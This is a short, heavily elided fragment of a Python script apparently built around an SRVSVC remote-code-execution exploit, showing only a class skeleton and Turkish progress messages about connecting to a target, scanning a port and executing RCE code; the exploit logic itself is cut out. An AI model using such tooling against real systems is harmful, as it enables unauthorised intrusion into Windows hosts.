...
class SRVSVC_Exploit(Thread):
    ...
    def __DCEPacket(self):
        if (self.os == '1'):
            ...
            sys.exit(-1)
        print(Fore.BLUE+'[i]'+Fore.RESET+' Hedef cihaza bağlanma...')
        ...
        print(Fore.YELLOW+'[+]'+Fore.RESET+' Hedef cihaza başarıyla bağlanıldı..')
        print(Fore.BLUE+'[i]'+Fore.RESET+' RCE Kodunu Yürütme...')
...
print(Fore.BLUE+'[i]'+Fore.RESET+f' Port "{port}" için hedef taranması "{target}" ...')
time.sleep(1)
print(Fore.BLUE+'[i]'+Fore.RESET+f' Target "{target}" geçerli görünüyor ...')
current.start()
